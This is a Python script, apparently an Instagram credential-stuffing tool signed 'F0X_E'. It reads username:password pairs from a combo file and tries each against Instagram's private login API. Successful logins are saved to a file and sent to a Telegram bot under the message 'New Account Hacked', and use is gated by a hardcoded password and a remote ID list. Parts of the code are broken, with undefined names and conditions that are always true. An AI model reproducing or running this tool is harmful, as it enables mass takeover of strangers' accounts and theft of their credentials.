import os
from time import sleep
import requests
from colored import fg
from uuid import uuid4
import random

try:
    import requests
except ImportError:
    os.system('pip install clear')
    import requests
    clear()
import os
import sys
import requests
import requests,sys,os,time

def xoshnaw():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  print("\x1b[37;1mID : "+id)
  try:
    httpCaht = requests.get("https://github.com/HAMACRAKAR/HAMACRAKAR/blob/main/list.txt").text
    if id in httpCaht:
      print("\033[92mYOUR ID IS ACTIVE!.....")
      msg = str(os.geteuid())
      time.sleep(0.3)
      pass
    else:
      print("\x1b[91mIDT ACTIVE NIA LA TELEGRAM NAMA BNERA....")
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
    if name == '__main__':
    	print(logo)
    	xoshnaw()
xoshnaw()
Sayeb = 'HAMAHAMA22'
pss=input("\033[1;37m [~]\033[1;35mENTER PASSWORD :\033[1;33m")
if pss ==Sayeb:
 pass
 print("\033[1;32m    PASSWORD✅ ")
 os.system('clear')
else:
 exit('\033[1;31m            Forget PASSWORD')


      
 
    
    	

os.system('color a')
logo = """
\033[32m
──────────────────────────────  F
╔╗╔╗╔══╗╔═╦═╗╔══╗╔╦╗╔╦╗╔═╗╔══╗  0
║╚╝║║╔╗║║║║║║║╔╗║║╔╝║║║║╬║╚╗╗║  X
║╔╗║║╠╣║║║║║║║╠╣║║╚╗║║║║╗╣╔╩╝║  _
╚╝╚╝╚╝╚╝╚╩═╩╝╚╝╚╝╚╩╝╚═╝╚╩╝╚══╝  E
──────────────────────────────  ☆
     
     
    Author >>> F0X_E

    Telegram >>> @F0X_E
"""
print(logo)
print("")
print("\033[31;1m[!] Welcome")
h , b,s,block = 0,0,0,0
tele = input("\033[32;1m[+] Send Hits To Telegram Bot? Y/n : ")
if "Y" in tele:
    id = input("\033[96;1m[+] Enter Telegram ID > : ")
    bot = input("\033[96;1m[+] Enter Token(Bot) : ")
elif "y" in tele:
    id = input("\033[96;1m[+] Enter Telegram ID > : ")
    bot = input("\033[96;1m[+] Enter Token(Bot) : ")
print(logo)
print("==========================")
ask = input("""[1] combo
==========================
[+] Start: """)

if ask == "1":
    assk = input("[+] Enter File Name : ")
    if '.txt' in assk:
        pass
    else:
        assk  = assk + '.txt'
    print(logo)
   
    print("")
    print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
    acc = open(assk,"r").read().splitlines()
    for combo in acc:
        user = combo.split(":")[0]
        pasw = combo.split(":")[1]
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                  t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=𝙷𝚒 @F0X_E 𝙽𝚎𝚠 𝙰𝚌𝚌𝚘𝚞𝚗𝚝 𝙷𝚊𝚌𝚔𝚎𝚍💘 ====================\n[=] 𝙴𝚖𝚊𝚒𝚕 : {user} \n[=] 𝙿𝚊𝚜𝚜 : {pasw}\n=========  @ZON_N  =========\𝙱𝚢 : @F0X_E")
         
            open("Hited Accounts.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'challenge_required' in log.text:
            s += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        else:
            b+=1    
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')

    